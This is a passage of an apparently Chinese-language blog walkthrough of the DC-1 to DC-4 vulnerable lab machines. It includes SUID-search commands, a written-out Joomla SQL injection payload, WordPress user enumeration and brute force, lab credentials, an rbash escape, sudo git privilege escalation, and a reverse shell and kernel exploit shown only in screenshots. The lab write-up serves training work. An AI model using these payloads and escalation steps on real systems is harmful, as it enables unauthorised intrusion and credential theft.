+</ul>
+<p>看到给了一个盐，感觉后面需要解密</p>
+<p>得到了数据库的账号密码，就进去看看呗, 看到这个数据库里有个users表，表头有啥</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130215936482.png" alt="image-20231130215936482"></p>
+<p>看看有什么user</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130220128601.png" alt="image-20231130220128601"></p>
+<p>然后查看pass</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130220355904.png" alt="image-20231130220355904"></p>
+<p>搜索系统中有没有加密的sh</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130220518362.png" alt="image-20231130220518362"></p>
+<p>果然有一个，然后通过这个shell，生成一个我们自己的一个hash，把他替换到数据库里</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130221406266.png" alt="image-20231130221406266"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130221542970.png" alt="image-20231130221542970"></p>
+<p>通过账号密码在页面登录，看到flag3</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130221919728.png" alt="image-20231130221919728"></p>
+<p>同时在&#x2F;home目录下还有flag4</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130222346346.png" alt="image-20231130222346346"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>尝试suid提权</p>
+<p>常用的suid查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130222929117.png" alt="image-20231130222929117"></p>
+<p>发现find可以执行，使用exec执行命令看看能不能利用</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130223111803.png" alt="image-20231130223111803"></p>
+<p>看来是可以的，使用执行&#x2F;bin&#x2F;sh，得到一个新的root权限的shell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130223821820.png" alt="image-20231130223821820"></p>
+<p>成功提权，查看最后的flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130223849575.png" alt="image-20231130223849575"></p>
+<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="探测-1"><a href="#探测-1" class="headerlink" title="探测"></a>探测</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201111356793.png" alt="image-20231201111356793"></p>
+<p>但是发现访问不了，而且自动跳转到了dc-2这个域名下，所以我们直接改hosts文件，将这个域名直接指向他的IP就行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201111427389.png" alt="image-20231201111427389"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201111613807.png" alt="image-20231201111613807"></p>
+<p>看看他的网站指纹</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201111708462.png" alt="image-20231201111708462"></p>
+<p>进入到首页看到第一个flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201111730840.png" alt="image-20231201111730840"></p>
+<p>之后扫描一下目录，看看有没有敏感文件或者是后台</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201112438696.png" alt="image-20231201112438696"></p>
+<p>果然扫到一个后台：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201140230798.png" alt="image-20231201140230798"></p>
+<p>由于是wordpress，所以直接使用wpscan工具，进行用户名的枚举</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201142334449.png" alt="image-20231201142334449"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201142427623.png" alt="image-20231201142427623"></p>
+<p>得到的三个用户名存入users.txt中</p>
+<p>之后通过cewl爬取一个密码的字典方便之后的爆破</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201142804256.png" alt="image-20231201142804256"></p>
+<p>得到了用户名，密码的字典，接下来就可以开始爆破了。 还是使用wpscan进行爆破。扫描出来两个账户</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201143032818.png" alt="image-20231201143032818"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201113238997.png" alt="image-20231201113238997"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jerry adipiscing</span><br><span class="line">tom parturient</span><br></pre></td></tr></table></figure>
+
+<p>登录jerry的账户，看到有个flag2，提示我们wordpress直接攻击不现实了，所以考虑其他办法。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201113357916.png" alt="image-20231201113357916"></p>
+<p>考虑到之前有一个端口还开放着，而且这个端口号有点奇怪且22端口没开，维护人员如何维护，所以可能是ssh的端口，通过ssh连接上去, 发现密码不对，不是wordpress的密码，用另外一个用户tom</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201143335160.png" alt="image-20231201143335160"></p>
+<p>成功进入shell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201143425964.png" alt="image-20231201143425964"></p>
+<p>并且发现有flag3，但是通过cat 显示没有找到这个命令。通过echo查看PATH路径，应该是没有加入bin</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201143547285.png" alt="image-20231201143547285"></p>
+<p>尝试添加&#x2F;usr&#x2F;bin和&#x2F;bin&#x2F; ，对tom用户是只读的，更改不了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201143639713.png" alt="image-20231201143639713"></p>
+<p>发现这是一个rbash，一个受限shell</p>
+<p>看到这篇文章可以看看如何绕过：</p>
+<p>最后试了一下，可以使用vi绕过，可以使用cd等命令了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201145623407.png" alt="image-20231201145623407"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201145631158.png" alt="image-20231201145631158"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201145653823.png" alt="image-20231201145653823"></p>
+<p>查看环境变量发现以及可以更改PATH了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export -p</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201145812799.png" alt="image-20231201145812799"></p>
+<p>写入这两个路径，就可以使用所有命令了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201145831111.png" alt="image-20231201145831111"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201145857279.png" alt="image-20231201145857279"></p>
+<p>首先查找suid文件，看看能不能进行提权</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201150154834.png" alt="image-20231201150154834"></p>
+<p>看看sudo可以执行啥，但是tom，不能执行，按照flag3的提示，还得su到jerry</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201150322841.png" alt="image-20231201150322841"></p>
+<p>通过jerry可以看到可以执行git 而且是nopasswd</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201150353981.png" alt="image-20231201150353981"></p>
+<p>使用git提权</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201150525781.png" alt="image-20231201150525781"></p>
+<p>成功拿下管理员权限</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201150542298.png" alt="image-20231201150542298"></p>
+<p>进入root目录拿到最后的flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231201150613490.png" alt="image-20231201150613490"></p>
+<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="进行IP地址收集"><a href="#进行IP地址收集" class="headerlink" title="进行IP地址收集"></a>进行IP地址收集</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231202235905951.png" alt="image-20231202235905951"></p>
+<h2 id="进行端口扫描"><a href="#进行端口扫描" class="headerlink" title="进行端口扫描"></a>进行端口扫描</h2><p>只打开了一个80端口，看来想ssh都不行，另外想办法咯</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231202235950305.png" alt="image-20231202235950305"></p>
+<h2 id="发现漏洞-1"><a href="#发现漏洞-1" class="headerlink" title="发现漏洞"></a>发现漏洞</h2><p>提示只有这一个flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203000042892.png" alt="image-20231203000042892"></p>
+<p>对目录进行扫描，底下的资源还是很丰富的，但是有用的只有这个后台</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203001030514.png" alt="image-20231203001030514"></p>
+<p>看看网站指纹，他的版本号，方便找漏洞</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203001558242.png" alt="image-20231203001558242"></p>
+<p>看了以下metasploit上的漏洞库，有一个正好是3.7.0的，但是用不了，另辟蹊径。这个漏洞是利用SQL注入，那就顺着这个思路注入一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203002712415.png" alt="image-20231203002712415"></p>
+<p>按照这个漏洞，网上的payload为，确实可以回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203002900619.png" alt="image-20231203002900619"></p>
+<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>那就利用这个注入点进行sql注入</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203003230732.png" alt="image-20231203003230732"></p>
+<p>成功拿到数据库</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203003244000.png" alt="image-20231203003244000"></p>
+<p>拿到数据库中的表</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203003318986.png" alt="image-20231203003318986"></p>
+<p>拿到这个表中的字段</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203003449132.png" alt="image-20231203003449132"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203003547797.png" alt="image-20231203003547797"></p>
+<p>脱库</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203003756003.png" alt="image-20231203003756003"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203003817667.png" alt="image-20231203003817667"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------+----------+--------------------------------------------------------------+</span><br><span class="line">| name   | username | password                                                     |</span><br><span class="line">+--------+----------+--------------------------------------------------------------+</span><br><span class="line">| admin  | admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |</span><br><span class="line">+--------+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>一个hash，利用john暴力破解，得到密码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203004202277.png" alt="image-20231203004202277"></p>
+<h2 id="进入拿到管理员权限进入后台"><a href="#进入拿到管理员权限进入后台" class="headerlink" title="进入拿到管理员权限进入后台"></a>进入拿到管理员权限进入后台</h2><p>翻了一下，有一个php文件，可以利用一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203004339331.png" alt="image-20231203004339331"></p>
+<p>写入代码，创建一个连接打开shell进程。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203004511641.png" alt="image-20231203004511641"></p>
+<p>攻击机进行监听</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203004622656.png" alt="image-20231203004622656"></p>
+<p>有个很尴尬的情况就是他有两个模板，所以都试试里面的index.php看看哪个是使用的就行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203004636165.png" alt="image-20231203004636165"></p>
+<p>写入反弹shell代码，得到一个交互式程序</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203004657689.png" alt="image-20231203004657689"></p>
+<p>翻了半天好像没有特别好的利用点，所以直接使用系统漏洞试试</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203004912002.png" alt="image-20231203004912002"></p>
+<p>查找这个版本有什么漏洞</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203005007932.png" alt="image-20231203005007932"></p>
+<p>后面试了试，这个39772.txt可以用，查看他的使用方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203005642840.png" alt="image-20231203005642840"></p>
+<p>从远程下载利用工具</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203005713062.png" alt="image-20231203005713062"></p>
+<p>执行exp，成功getshell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203005735136.png" alt="image-20231203005735136"></p>
+<p>拿到flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203005752980.png" alt="image-20231203005752980"></p>
+<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><p>常规的扫描</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203141903912.png" alt="image-20231203141903912"></p>
